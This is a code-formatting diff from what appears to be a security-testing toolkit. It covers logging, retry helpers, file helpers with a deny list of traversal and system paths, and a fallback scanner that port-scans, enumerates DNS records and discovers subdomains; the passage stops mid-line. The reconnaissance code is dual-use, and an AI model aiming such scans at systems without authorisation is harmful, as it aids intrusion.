\"\"\"Enhanced logging with context\"\"\"\n         # Combine context with additional kwargs\n         context = {**self.error_context, **kwargs}\n-        \n+\n         if context:\n             context_str = \" | \".join(f\"{k}={v}\" for k, v in context.items())\n             message = f\"{message} [{context_str}]\"\n-        \n+\n         level_map = {\n             \"DEBUG\": self.logger.debug,\n             \"INFO\": self.logger.info,\n             \"WARNING\": self.logger.warning,\n             \"ERROR\": self.logger.error,\n-            \"CRITICAL\": self.logger.critical\n+            \"CRITICAL\": self.logger.critical,\n         }\n-        \n+\n         log_func = level_map.get(level.upper(), self.logger.info)\n         log_func(message)\n-    \n-    def log_exception(self, exc: Exception, message: str = \"Exception occurred\") -> None:\n+\n+    def log_exception(\n+        self, exc: Exception, message: str = \"Exception occurred\"\n+    ) -> None:\n         \"\"\"Log exception with full context and traceback\"\"\"\n         self.logger.error(\n-            f\"{message}: {exc}\",\n-            exc_info=True,\n-            extra={\"context\": self.error_context}\n+            f\"{message}: {exc}\", exc_info=True, extra={\"context\": self.error_context}\n         )\n-    \n-    def log_tool_error(self, tool_name: str, error: str, return_code: Optional[int] = None) -> None:\n+\n+    def log_tool_error(\n+        self, tool_name: str, error: str, return_code: Optional[int] = None\n+    ) -> None:\n         \"\"\"Log tool execution errors with structured information\"\"\"\n         error_info = {\n             \"tool\": tool_name,\n             \"error\": error,\n             \"return_code\": return_code,\n-            \"timestamp\": datetime.utcnow().isoformat()\n+            \"timestamp\": datetime.utcnow().isoformat(),\n         }\n-        \n-        self.log(\n-            f\"Tool execution failed: {tool_name}\",\n-            \"ERROR\",\n-            **error_info\n-        )\n-    \n+\n+        self.log(f\"Tool execution failed: {tool_name}\", \"ERROR\", **error_info)\n+\n     def export_error_summary(self) -> Dict[str, Any]:\n         \"\"\"Export error summary for reporting\"\"\"\n         summary = {\n             \"total_errors\": self._count_log_entries(\"ERROR\"),\n             \"total_warnings\": self._count_log_entries(\"WARNING\"),\n             \"total_critical\": self._count_log_entries(\"CRITICAL\"),\n-            \"log_file\": str(self.log_file) if hasattr(self, 'log_file') else None,\n-            \"generated_at\": datetime.utcnow().isoformat()\n+            \"log_file\": str(self.log_file) if hasattr(self, \"log_file\") else None,\n+            \"generated_at\": datetime.utcnow().isoformat(),\n         }\n         return summary\n-    \n+\n     def _count_log_entries(self, level: str) -> int:\n         \"\"\"Count log entries of specific level\"\"\"\n-        if not hasattr(self, 'log_file') or not self.log_file.exists():\n+        if not hasattr(self, \"log_file\") or not self.log_file.exists():\n             return 0\n-        \n+\n         try:\n-            with open(self.log_file, 'r') as f:\n+            with open(self.log_file, \"r\") as f:\n                 return sum(1 for line in f if f\" - {level} - \" in line)\n         except Exception:\n             return 0\n \n     # Backward compatibility methods\n-    def log_with_context(self, level: str, message: str, context: Dict[str, Any] = None):\n+    def log_with_context(\n+        self, level: str, message: str, context: Dict[str, Any] = None\n+    ):\n         \"\"\"Log message with additional context information - backward compatibility\"\"\"\n         if context:\n             self.set_context(**context)\n         self.log(message, level.upper())\n         if context:\n             self.clear_context()\n-    \n-    def error(self, message: str, context: Dict[str, Any] = None, exc_info: bool = True):\n+\n+    def error(\n+        self, message: str, context: Dict[str, Any] = None, exc_info: bool = True\n+    ):\n         \"\"\"Log error with full context and exception information\"\"\"\n         if context:\n             self.set_context(**context)\n         if exc_info and sys.exc_info()[0]:\n             self.log_exception(sys.exc_info()[1], message)\n         else:\n             self.log(message, \"ERROR\")\n         if context:\n             self.clear_context()\n-    \n+\n     def warning(self, message: str, context: Dict[str, Any] = None):\n         \"\"\"Log warning with context\"\"\"\n-        self.log_with_context('warning', message, context)\n-    \n+        self.log_with_context(\"warning\", message, context)\n+\n     def info(self, message: str, context: Dict[str, Any] = None):\n         \"\"\"Log info with context\"\"\"\n-        self.log_with_context('info', message, context)\n-    \n+        self.log_with_context(\"info\", message, context)\n+\n     def debug(self, message: str, context: Dict[str, Any] = None):\n         \"\"\"Log debug with context\"\"\"\n-        self.log_with_context('debug', message, context)\n+        self.log_with_context(\"debug\", message, context)\n \n \n class ErrorRecoveryManager:\n     \"\"\"Manages error recovery and retry strategies\"\"\"\n-    \n+\n     def __init__(self, logger: EnhancedLogger):\n         self.logger = logger\n         self.failure_counts = {}\n-    \n+\n     def retry_with_exponential_backoff(\n-        self, \n+        self,\n         max_retries: int = 3,\n         base_delay: float = 1.0,\n         max_delay: float = 60.0,\n-        exceptions: tuple = (Exception,)\n+        exceptions: tuple = (Exception,),\n     ):\n         \"\"\"Decorator for retrying functions with exponential backoff\"\"\"\n+\n         def decorator(func: F) -> F:\n             @functools.wraps(func)\n             def wrapper(*args, **kwargs):\n                 last_exception = None\n-                \n+\n                 for attempt in range(max_retries + 1):\n                     try:\n                         result = func(*args, **kwargs)\n-                        \n+\n                         # Reset failure count on success\n                         func_name = f\"{func.__module__}.{func.__name__}\"\n                         if func_name in self.failure_counts:\n                             del self.failure_counts[func_name]\n-                        \n+\n                         return result\n-                        \n+\n                     except exceptions as e:\n                         last_exception = e\n                         func_name = f\"{func.__module__}.{func.__name__}\"\n-                        \n+\n                         # Track failure count\n-                        self.failure_counts[func_name] = self.failure_counts.get(func_name, 0) + 1\n-                        \n+                        self.failure_counts[func_name] = (\n+                            self.failure_counts.get(func_name, 0) + 1\n+                        )\n+\n                         if attempt < max_retries:\n-                            delay = min(base_delay * (2 ** attempt), max_delay)\n+                            delay = min(base_delay * (2**attempt), max_delay)\n                             self.logger.warning(\n                                 f\"Function {func_name} failed (attempt {attempt + 1}/{max_retries + 1}), retrying in {delay:.1f}s\",\n-                                {'function': func_name, 'attempt': attempt + 1, 'error': str(e), 'delay': delay}\n+                                {\n+                                    \"function\": func_name,\n+                                    \"attempt\": attempt + 1,\n+                                    \"error\": str(e),\n+                                    \"delay\": delay,\n+                                },\n                             )\n                             import time\n+\n                             time.sleep(delay)\n                         else:\n                             self.logger.error(\n                                 f\"Function {func_name} failed after {max_retries + 1} attempts\",\n-                                {'function': func_name, 'total_attempts': max_retries + 1, 'final_error': str(e)}\n+                                {\n+                                    \"function\": func_name,\n+                                    \"total_attempts\": max_retries + 1,\n+                                    \"final_error\": str(e),\n+                                },\n                             )\n-                \n+\n                 raise last_exception\n+\n             return wrapper\n+\n         return decorator\n-    \n-    def circuit_breaker(self, failure_threshold: int = 5, recovery_timeout: float = 300):\n+\n+    def circuit_breaker(\n+        self, failure_threshold: int = 5, recovery_timeout: float = 300\n+    ):\n         \"\"\"Circuit breaker pattern to prevent cascading failures\"\"\"\n+\n         def decorator(func: F) -> F:\n             func_name = f\"{func.__module__}.{func.__name__}\"\n-            state = {'failures': 0, 'last_failure': 0, 'state': 'closed'}  # closed, open, half-open\n-            \n+            state = {\n+                \"failures\": 0,\n+                \"last_failure\": 0,\n+                \"state\": \"closed\",\n+            }  # closed, open, half-open\n+\n             @functools.wraps(func)\n             def wrapper(*args, **kwargs):\n                 import time\n+\n                 now = time.time()\n-                \n+\n                 # Check circuit state\n-                if state['state'] == 'open':\n-                    if now - state['last_failure'] > recovery_timeout:\n-                        state['state'] = 'half-open'\n-                        self.logger.info(f\"Circuit breaker for {func_name} moving to half-open state\")\n+                if state[\"state\"] == \"open\":\n+                    if now - state[\"last_failure\"] > recovery_timeout:\n+                        state[\"state\"] = \"half-open\"\n+                        self.logger.info(\n+                            f\"Circuit breaker for {func_name} moving to half-open state\"\n+                        )\n                     else:\n-                        raise SecurityTestingError(f\"Circuit breaker open for {func_name}\")\n-                \n+                        raise SecurityTestingError(\n+                            f\"Circuit breaker open for {func_name}\"\n+                        )\n+\n                 try:\n                     result = func(*args, **kwargs)\n-                    \n+\n                     # Success - reset or close circuit\n-                    if state['state'] in ['half-open', 'open']:\n-                        self.logger.info(f\"Circuit breaker for {func_name} closing (success)\")\n-                    state['failures'] = 0\n-                    state['state'] = 'closed'\n-                    \n+                    if state[\"state\"] in [\"half-open\", \"open\"]:\n+                        self.logger.info(\n+                            f\"Circuit breaker for {func_name} closing (success)\"\n+                        )\n+                    state[\"failures\"] = 0\n+                    state[\"state\"] = \"closed\"\n+\n                     return result\n-                    \n+\n                 except Exception as e:\n-                    state['failures'] += 1\n-                    state['last_failure'] = now\n-                    \n-                    if state['failures'] >= failure_threshold:\n-                        state['state'] = 'open'\n+                    state[\"failures\"] += 1\n+                    state[\"last_failure\"] = now\n+\n+                    if state[\"failures\"] >= failure_threshold:\n+                        state[\"state\"] = \"open\"\n                         self.logger.error(\n                             f\"Circuit breaker opened for {func_name} after {failure_threshold} failures\",\n-                            {'function': func_name, 'failures': state['failures']}\n+                            {\"function\": func_name, \"failures\": state[\"failures\"]},\n                         )\n-                    \n+\n                     raise\n-            \n+\n             return wrapper\n+\n         return decorator\n \n \n class SafeExecutor:\n     \"\"\"Safe execution context with enhanced error handling\"\"\"\n-    \n+\n     def __init__(self, logger: EnhancedLogger, recovery_manager: ErrorRecoveryManager):\n         self.logger = logger\n         self.recovery_manager = recovery_manager\n-    \n-    def execute_with_fallback(self, primary_func: Callable, fallback_funcs: list, *args, **kwargs):\n+\n+    def execute_with_fallback(\n+        self, primary_func: Callable, fallback_funcs: list, *args, **kwargs\n+    ):\n         \"\"\"Execute function with fallback options\"\"\"\n         functions_to_try = [primary_func] + fallback_funcs\n-        \n+\n         for i, func in enumerate(functions_to_try):\n             try:\n                 self.logger.debug(f\"Attempting execution with {func.__name__}\")\n                 result = func(*args, **kwargs)\n-                \n+\n                 if i > 0:  # Used a fallback\n-                    self.logger.warning(f\"Primary function failed, succeeded with fallback: {func.__name__}\")\n-                \n+                    self.logger.warning(\n+                        f\"Primary function failed, succeeded with fallback: {func.__name__}\"\n+                    )\n+\n                 return result\n-                \n+\n             except Exception as e:\n                 if i == len(functions_to_try) - 1:  # Last function failed\n-                    self.logger.error(f\"All execution attempts failed, last error from {func.__name__}: {e}\")\n+                    self.logger.error(\n+                        f\"All execution attempts failed, last error from {func.__name__}: {e}\"\n+                    )\n                     raise\n                 else:\n-                    self.logger.warning(f\"Function {func.__name__} failed, trying fallback: {e}\")\n-        \n+                    self.logger.warning(\n+                        f\"Function {func.__name__} failed, trying fallback: {e}\"\n+                    )\n+\n         raise SecurityTestingError(\"No valid execution path found\")\n-    \n-    def safe_call(self, func: Callable, default_return=None, suppress_exceptions=True, *args, **kwargs):\n+\n+    def safe_call(\n+        self,\n+        func: Callable,\n+        default_return=None,\n+        suppress_exceptions=True,\n+        *args,\n+        **kwargs,\n+    ):\n         \"\"\"Safely call a function with optional exception suppression\"\"\"\n         try:\n             return func(*args, **kwargs)\n         except Exception as e:\n             self.logger.error(f\"Safe call to {func.__name__} failed: {e}\")\n@@ -348,24 +400,25 @@\n \n def safe_execute(\n     default: Any = None,\n     error_msg: str = \"Operation failed\",\n     log_level: str = \"ERROR\",\n-    raise_on_error: bool = False\n+    raise_on_error: bool = False,\n ) -> Callable[[F], F]:\n     \"\"\"\n     Decorator for safe function execution with enhanced error handling\n-    \n+\n     Args:\n         default: Default value to return on error\n         error_msg: Error message prefix\n         log_level: Logging level for errors\n         raise_on_error: Whether to raise exception after logging\n-    \n+\n     Returns:\n         Decorated function with error handling\n     \"\"\"\n+\n     def decorator(func: F) -> F:\n         @functools.wraps(func)\n         def wrapper(*args, **kwargs):\n             try:\n                 return func(*args, **kwargs)\n@@ -374,260 +427,271 @@\n                 raise\n             except Exception as e:\n                 error_context = {\n                     \"function\": func.__name__,\n                     \"args_count\": len(args),\n-                    \"kwargs_keys\": list(kwargs.keys()) if kwargs else []\n+                    \"kwargs_keys\": list(kwargs.keys()) if kwargs else [],\n                 }\n-                \n+\n                 enhanced_logger.set_context(**error_context)\n                 enhanced_logger.log_exception(e, f\"{error_msg} in {func.__name__}\")\n                 enhanced_logger.clear_context()\n-                \n+\n                 if raise_on_error:\n                     raise\n-                    \n+\n                 return default\n-                \n+\n         return wrapper\n+\n     return decorator\n \n \n def validate_input(\n-    value: Any,\n-    validators: Dict[str, Any],\n-    field_name: str = \"input\"\n+    value: Any, validators: Dict[str, Any], field_name: str = \"input\"\n ) -> bool:\n     \"\"\"\n     Enhanced input validation with multiple checks\n-    \n+\n     Args:\n         value: Value to validate\n         validators: Dictionary of validation rules\n         field_name: Name of field being validated\n-    \n+\n     Returns:\n         True if validation passes\n-        \n+\n     Raises:\n         ValidationError: If validation fails\n     \"\"\"\n     errors = []\n-    \n+\n     # Type validation\n     if \"type\" in validators:\n         expected_type = validators[\"type\"]\n         if not isinstance(value, expected_type):\n             errors.append(f\"{field_name} must be of type {expected_type.__name__}\")\n-    \n+\n     # String-specific validations\n     if isinstance(value, str):\n         # Length validation\n         if \"max_length\" in validators:\n             max_len = validators[\"max_length\"]\n             if len(value) > max_len:\n                 errors.append(f\"{field_name} exceeds maximum length of {max_len}\")\n-        \n+\n         if \"min_length\" in validators:\n             min_len = validators[\"min_length\"]\n             if len(value) < min_len:\n                 errors.append(f\"{field_name} below minimum length of {min_len}\")\n-        \n+\n         # Pattern validation\n         if \"pattern\" in validators:\n             pattern = validators[\"pattern\"]\n             # Handle both string patterns and compiled regex objects\n             if isinstance(pattern, str):\n                 import re\n+\n                 pattern = re.compile(pattern)\n             if not pattern.match(value):\n                 errors.append(f\"{field_name} does not match required pattern\")\n-        \n+\n         # Forbidden content\n         if \"forbidden\" in validators:\n             forbidden = validators[\"forbidden\"]\n             for forbidden_item in forbidden:\n                 if forbidden_item.lower() in value.lower():\n-                    errors.append(f\"{field_name} contains forbidden content: {forbidden_item}\")\n-    \n+                    errors.append(\n+                        f\"{field_name} contains forbidden content: {forbidden_item}\"\n+                    )\n+\n     # Numeric validations\n     if isinstance(value, (int, float)):\n         if \"min_value\" in validators:\n             min_val = validators[\"min_value\"]\n             if value < min_val:\n                 errors.append(f\"{field_name} below minimum value of {min_val}\")\n-        \n+\n         if \"max_value\" in validators:\n             max_val = validators[\"max_value\"]\n             if value > max_val:\n                 errors.append(f\"{field_name} exceeds maximum value of {max_val}\")\n-    \n+\n     # Empty value check\n     if \"allow_empty\" in validators and not validators[\"allow_empty\"]:\n         if not value or (isinstance(value, str) and not value.strip()):\n             errors.append(f\"{field_name} cannot be empty\")\n-    \n+\n     if errors:\n-        raise ValidationError(f\"Validation failed for {field_name}: {'; '.join(errors)}\")\n-    \n+        raise ValidationError(\n+            f\"Validation failed for {field_name}: {'; '.join(errors)}\"\n+        )\n+\n     return True\n \n \n @safe_execute(default=False, error_msg=\"File operation failed\")\n def safe_file_write(file_path: Path, content: str, encoding: str = \"utf-8\") -> bool:\n     \"\"\"\n     Safely write content to file with error handling\n-    \n+\n     Args:\n         file_path: Path to write to\n         content: Content to write\n         encoding: File encoding\n-        \n+\n     Returns:\n         True if successful, False otherwise\n     \"\"\"\n     # Input validation\n-    validate_input(str(file_path), {\n-        \"type\": str,\n-        \"max_length\": 1000,\n-        \"forbidden\": [\"..\", \"/etc/\", \"/root/\", \"/bin/\"]\n-    }, \"file_path\")\n-    \n-    validate_input(content, {\n-        \"type\": str,\n-        \"max_length\": 10 * 1024 * 1024  # 10MB limit\n-    }, \"content\")\n-    \n+    validate_input(\n+        str(file_path),\n+        {\n+            \"type\": str,\n+            \"max_length\": 1000,\n+            \"forbidden\": [\"..\", \"/etc/\", \"/root/\", \"/bin/\"],\n+        },\n+        \"file_path\",\n+    )\n+\n+    validate_input(\n+        content, {\"type\": str, \"max_length\": 10 * 1024 * 1024}, \"content\"  # 10MB limit\n+    )\n+\n     # Ensure parent directory exists\n     file_path.parent.mkdir(parents=True, exist_ok=True)\n-    \n+\n     # Atomic write operation\n-    with open(file_path, 'w', encoding=encoding) as f:\n+    with open(file_path, \"w\", encoding=encoding) as f:\n         f.write(content)\n-    \n+\n     enhanced_logger.log(f\"Successfully wrote file: {file_path}\", \"DEBUG\")\n     return True\n \n \n @safe_execute(default=None, error_msg=\"File read failed\")\n def safe_file_read(file_path: Path, encoding: str = \"utf-8\") -> Optional[str]:\n     \"\"\"\n     Safely read file content with error handling\n-    \n+\n     Args:\n         file_path: Path to read from\n         encoding: File encoding\n-        \n+\n     Returns:\n         File content or None on error\n     \"\"\"\n     if not file_path.exists():\n         enhanced_logger.log(f\"File not found: {file_path}\", \"WARNING\")\n         return None\n-    \n+\n     if not file_path.is_file():\n-        enhanced_logger.log(f\"Path is not a file: {file_path}\", \"WARNING\") \n+        enhanced_logger.log(f\"Path is not a file: {file_path}\", \"WARNING\")\n         return None\n-    \n+\n     # Check file size (limit to 50MB)\n     if file_path.stat().st_size > 50 * 1024 * 1024:\n         enhanced_logger.log(f\"File too large to read: {file_path}\", \"WARNING\")\n         return None\n-    \n-    with open(file_path, 'r', encoding=encoding) as f:\n+\n+    with open(file_path, \"r\", encoding=encoding) as f:\n         content = f.read()\n-    \n+\n     enhanced_logger.log(f\"Successfully read file: {file_path}\", \"DEBUG\")\n     return content\n \n \n class ErrorRecovery:\n     \"\"\"Error recovery and retry mechanisms\"\"\"\n-    \n+\n     @staticmethod\n     def retry_operation(\n         func: Callable,\n         max_attempts: int = 3,\n         delay_seconds: float = 1.0,\n         backoff_factor: float = 2.0,\n-        exceptions: tuple = (Exception,)\n+        exceptions: tuple = (Exception,),\n     ) -> Any:\n         \"\"\"\n         Retry operation with exponential backoff\n-        \n+\n         Args:\n             func: Function to retry\n             max_attempts: Maximum retry attempts\n             delay_seconds: Initial delay between retries\n             backoff_factor: Backoff multiplier\n             exceptions: Exceptions to catch and retry on\n-            \n+\n         Returns:\n             Function result\n-            \n+\n         Raises:\n             Last exception if all retries fail\n         \"\"\"\n         import time\n-        \n+\n         last_exception = None\n         delay = delay_seconds\n-        \n+\n         for attempt in range(max_attempts):\n             try:\n                 return func()\n             except exceptions as e:\n                 last_exception = e\n-                \n+\n                 if attempt < max_attempts - 1:\n                     enhanced_logger.log(\n                         f\"Retry attempt {attempt + 1}/{max_attempts} after {delay}s delay\",\n                         \"WARNING\",\n-                        error=str(e)\n+                        error=str(e),\n                     )\n                     time.sleep(delay)\n                     delay *= backoff_factor\n                 else:\n                     enhanced_logger.log(\n                         f\"All retry attempts failed for operation\",\n                         \"ERROR\",\n                         attempts=max_attempts,\n-                        final_error=str(e)\n+                        final_error=str(e),\n                     )\n-        \n+\n         if last_exception:\n             raise last_exception\n+\n \n # Enhanced recovery strategies\n class AdvancedErrorRecovery:\n     \"\"\"Advanced error recovery with multiple strategies\"\"\"\n-    \n+\n     def __init__(self):\n         self.recovery_strategies = {}\n         self.fallback_handlers = {}\n-    \n+\n     def register_fallback(self, operation: str, fallback_func: Callable):\n         \"\"\"Register a fallback function for an operation\"\"\"\n         self.fallback_handlers[operation] = fallback_func\n-    \n+\n     def safe_execute(self, operation: str, func: Callable, *args, **kwargs):\n         \"\"\"Execute function with multiple recovery strategies\"\"\"\n         try:\n             return func(*args, **kwargs)\n         except Exception as e:\n             enhanced_logger.warning(f\"Operation {operation} failed: {str(e)}\")\n-            \n+\n             # Try fallback if available\n             if operation in self.fallback_handlers:\n                 try:\n                     enhanced_logger.info(f\"Attempting fallback for {operation}\")\n                     return self.fallback_handlers[operation](*args, **kwargs)\n                 except Exception as fallback_e:\n-                    enhanced_logger.error(f\"Fallback for {operation} also failed: {str(fallback_e)}\")\n-            \n+                    enhanced_logger.error(\n+                        f\"Fallback for {operation} also failed: {str(fallback_e)}\"\n+                    )\n+\n             # Log and re-raise if no fallback available\n             enhanced_logger.error(f\"No recovery possible for {operation}\")\n             raise\n \n+\n # Global recovery manager instance\n advanced_recovery = AdvancedErrorRecovery()\n-circuit_breaker = recovery_manager.circuit_breaker\n\\ No newline at end of file\n+circuit_breaker = recovery_manager.circuit_breaker\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/final_integration_test.py\t2025-09-14 19:10:58.551754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/final_integration_test.py\t2025-09-14 19:23:11.860011+00:00\n@@ -20,11 +20,14 @@\n     print(\"-\" * 40)\n \n     try:\n         # Test script can start without errors (timeout after a few seconds)\n         result = subprocess.run(\n-            [sys.executable, \"bl4ckc3ll_p4nth30n.py\", \"--help\"], capture_output=True, text=True, timeout=10\n+            [sys.executable, \"bl4ckc3ll_p4nth30n.py\", \"--help\"],\n+            capture_output=True,\n+            text=True,\n+            timeout=10,\n         )\n \n         if result.returncode == 0:\n             print(\"\u2705 Main script executes successfully\")\n             # Check for enhanced menu options\n@@ -159,11 +162,13 @@\n                 function_count += 1\n                 print(f\"\u2705 {func_name}\")\n             else:\n                 print(f\"\u274c {func_name} missing\")\n \n-        print(f\"\\nEnhanced Functions Available: {function_count}/{len(enhanced_functions)}\")\n+        print(\n+            f\"\\nEnhanced Functions Available: {function_count}/{len(enhanced_functions)}\"\n+        )\n \n         # Test that directories exist\n         essential_dirs = [\"wordlists_extra\", \"external_lists\", \"payloads\", \"runs\"]\n         dir_count = 0\n         for dir_name in essential_dirs:\n@@ -190,11 +195,13 @@\n \n         print(\"\u2705 Enhanced features test completed\")\n \n     except Exception as e:\n         print(f\"\u274c Enhanced features test failed: {e}\")\n-        print(\"\u26a0\ufe0f Warning: Enhanced features test failed - may be development environment\")\n+        print(\n+            \"\u26a0\ufe0f Warning: Enhanced features test failed - may be development environment\"\n+        )\n \n \n def test_bug_bounty_quick():\n     \"\"\"Quick test of bug bounty functionality\"\"\"\n     print(\"\\n\ud83c\udff9 Quick Bug Bounty Function Test\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/fallback_scanner.py\t2025-09-14 19:10:58.551754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/fallback_scanner.py\t2025-09-14 19:23:11.919033+00:00\n@@ -13,638 +13,715 @@\n import requests\n from pathlib import Path\n from datetime import datetime\n from typing import Dict, List, Any, Optional, Tuple\n from urllib.parse import urlparse\n+\n try:\n     import dns.resolver\n+\n     DNS_AVAILABLE = True\n except ImportError:\n     DNS_AVAILABLE = False\n import concurrent.futures\n from dataclasses import dataclass, field\n \n+\n @dataclass\n class ScanResult:\n     \"\"\"Fallback scan result\"\"\"\n+\n     target: str\n     scan_type: str\n     success: bool\n     findings: List[Dict] = field(default_factory=list)\n     metadata: Dict = field(default_factory=dict)\n     error: Optional[str] = None\n     duration: float = 0.0\n \n+\n class FallbackScanner:\n     \"\"\"High-reliability fallback scanner that works without external tools\"\"\"\n-    \n+\n     def __init__(self):\n         self.session = requests.Session()\n-        self.session.headers.update({\n-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'\n-        })\n-        \n+        self.session.headers.update(\n+            {\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\"}\n+        )\n+\n         # Common ports for scanning\n         self.common_ports = [80, 443, 22, 21, 25, 53, 110, 143, 993, 995, 8080, 8443]\n-        \n+\n         # DNS resolvers\n-        self.dns_resolvers = ['8.8.8.8', '1.1.1.1', '208.67.222.222']\n-        \n+        self.dns_resolvers = [\"8.8.8.8\", \"1.1.1.1\", \"208.67.222.222\"]\n+\n     def scan_target(self, target: str, output_dir: Path) -> List[ScanResult]:\n         \"\"\"Perform comprehensive fallback scan of a target\"\"\"\n         results = []\n-        \n+\n         # Determine target type\n         if self._is_ip_address(target):\n             results.extend(self._scan_ip(target, output_dir))\n         elif self._is_domain(target):\n             results.extend(self._scan_domain(target, output_dir))\n         elif self._is_url(target):\n             results.extend(self._scan_url(target, output_dir))\n         else:\n             # Try as domain first\n             results.extend(self._scan_domain(target, output_dir))\n-        \n+\n         return results\n-    \n+\n     def _is_ip_address(self, target: str) -> bool:\n         \"\"\"Check if target is an IP address\"\"\"\n         try:\n             socket.inet_aton(target)\n             return True\n         except socket.error:\n             return False\n-    \n+\n     def _is_domain(self, target: str) -> bool:\n         \"\"\"Check if target is a domain\"\"\"\n-        return '.' in target and not target.startswith(('http://', 'https://'))\n-    \n+        return \".\" in target and not target.startswith((\"http://\", \"https://\"))\n+\n     def _is_url(self, target: str) -> bool:\n         \"\"\"Check if target is a URL\"\"\"\n-        return target.startswith(('http://', 'https://'))\n-    \n+        return target.startswith((\"http://\", \"https://\"))\n+\n     def _scan_ip(self, ip: str, output_dir: Path) -> List[ScanResult]:\n         \"\"\"Scan an IP address\"\"\"\n         results = []\n-        \n+\n         # Port scan\n         results.append(self._port_scan(ip, output_dir))\n-        \n+\n         # HTTP checks if common web ports are open\n         for port in [80, 443, 8080, 8443]:\n             if self._is_port_open(ip, port):\n-                protocol = 'https' if port in [443, 8443] else 'http'\n+                protocol = \"https\" if port in [443, 8443] else \"http\"\n                 url = f\"{protocol}://{ip}:{port}\"\n                 results.extend(self._scan_web_service(url, output_dir))\n-        \n+\n         return [r for r in results if r is not None]\n-    \n+\n     def _scan_domain(self, domain: str, output_dir: Path) -> List[ScanResult]:\n         \"\"\"Scan a domain\"\"\"\n         results = []\n-        \n+\n         # DNS enumeration\n         results.append(self._dns_enumeration(domain, output_dir))\n-        \n+\n         # Subdomain discovery\n         results.append(self._basic_subdomain_discovery(domain, output_dir))\n-        \n+\n         # HTTP/HTTPS checks\n-        for protocol in ['http', 'https']:\n+        for protocol in [\"http\", \"https\"]:\n             url = f\"{protocol}://{domain}\"\n             results.extend(self._scan_web_service(url, output_dir))\n-        \n+\n         # Try to resolve domain and scan IP\n         try:\n             ip = socket.gethostbyname(domain)\n             results.append(self._port_scan(ip, output_dir, domain_context=domain))\n         except socket.gaierror:\n             pass\n-        \n+\n         return [r for r in results if r is not None]\n-    \n+\n     def _scan_url(self, url: str, output_dir: Path) -> List[ScanResult]:\n         \"\"\"Scan a URL\"\"\"\n         results = []\n-        \n+\n         # Web service scan\n         results.extend(self._scan_web_service(url, output_dir))\n-        \n+\n         # Extract domain and scan it\n         parsed = urlparse(url)\n         if parsed.hostname:\n             results.extend(self._scan_domain(parsed.hostname, output_dir))\n-        \n+\n         return [r for r in results if r is not None]\n-    \n-    def _port_scan(self, ip: str, output_dir: Path, domain_context: str = None) -> ScanResult:\n+\n+    def _port_scan(\n+        self, ip: str, output_dir: Path, domain_context: str = None\n+    ) -> ScanResult:\n         \"\"\"Basic port scan using socket connections\"\"\"\n         start_time = time.time()\n         open_ports = []\n-        \n+\n         def check_port(port):\n             try:\n                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n                     sock.settimeout(3)\n                     result = sock.connect_ex((ip, port))\n                     if result == 0:\n                         return port\n             except:\n                 pass\n             return None\n-        \n+\n         # Concurrent port scanning\n         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:\n             futures = [executor.submit(check_port, port) for port in self.common_ports]\n             for future in concurrent.futures.as_completed(futures):\n                 port = future.result()\n                 if port:\n                     open_ports.append(port)\n-        \n+\n         duration = time.time() - start_time\n-        \n+\n         # Save results\n         target_name = domain_context or ip\n         output_file = output_dir / f\"portscan_{target_name.replace(':', '_')}.json\"\n-        \n+\n         findings = []\n         for port in sorted(open_ports):\n-            findings.append({\n-                'type': 'open_port',\n-                'port': port,\n-                'service': self._guess_service(port),\n-                'ip': ip\n-            })\n-        \n+            findings.append(\n+                {\n+                    \"type\": \"open_port\",\n+                    \"port\": port,\n+                    \"service\": self._guess_service(port),\n+                    \"ip\": ip,\n+                }\n+            )\n+\n         result_data = {\n-            'target': ip,\n-            'scan_type': 'port_scan',\n-            'open_ports': sorted(open_ports),\n-            'total_ports_scanned': len(self.common_ports),\n-            'findings': findings,\n-            'duration': duration\n+            \"target\": ip,\n+            \"scan_type\": \"port_scan\",\n+            \"open_ports\": sorted(open_ports),\n+            \"total_ports_scanned\": len(self.common_ports),\n+            \"findings\": findings,\n+            \"duration\": duration,\n         }\n-        \n+\n         self._save_json_result(output_file, result_data)\n-        \n+\n         return ScanResult(\n             target=target_name,\n-            scan_type='port_scan',\n+            scan_type=\"port_scan\",\n             success=True,\n             findings=findings,\n-            metadata={'open_ports': len(open_ports), 'scanned_ports': len(self.common_ports)},\n-            duration=duration\n+            metadata={\n+                \"open_ports\": len(open_ports),\n+                \"scanned_ports\": len(self.common_ports),\n+            },\n+            duration=duration,\n         )\n-    \n+\n     def _dns_enumeration(self, domain: str, output_dir: Path) -> ScanResult:\n         \"\"\"DNS enumeration using standard DNS queries\"\"\"\n         start_time = time.time()\n         findings = []\n-        \n+\n         if DNS_AVAILABLE:\n-            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']\n-            \n+            record_types = [\"A\", \"AAAA\", \"MX\", \"NS\", \"TXT\", \"CNAME\", \"SOA\"]\n+\n             for record_type in record_types:\n                 try:\n                     answers = dns.resolver.resolve(domain, record_type)\n                     for answer in answers:\n-                        findings.append({\n-                            'type': 'dns_record',\n-                            'record_type': record_type,\n-                            'value': str(answer),\n-                            'domain': domain\n-                        })\n+                        findings.append(\n+                            {\n+                                \"type\": \"dns_record\",\n+                                \"record_type\": record_type,\n+                                \"value\": str(answer),\n+                                \"domain\": domain,\n+                            }\n+                        )\n                 except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, Exception):\n                     pass\n         else:\n             # Basic DNS resolution without dnspython\n             try:\n                 # A record\n                 ip = socket.gethostbyname(domain)\n-                findings.append({\n-                    'type': 'dns_record',\n-                    'record_type': 'A',\n-                    'value': ip,\n-                    'domain': domain\n-                })\n-                \n+                findings.append(\n+                    {\n+                        \"type\": \"dns_record\",\n+                        \"record_type\": \"A\",\n+                        \"value\": ip,\n+                        \"domain\": domain,\n+                    }\n+                )\n+\n                 # Try reverse DNS\n                 try:\n                     hostname = 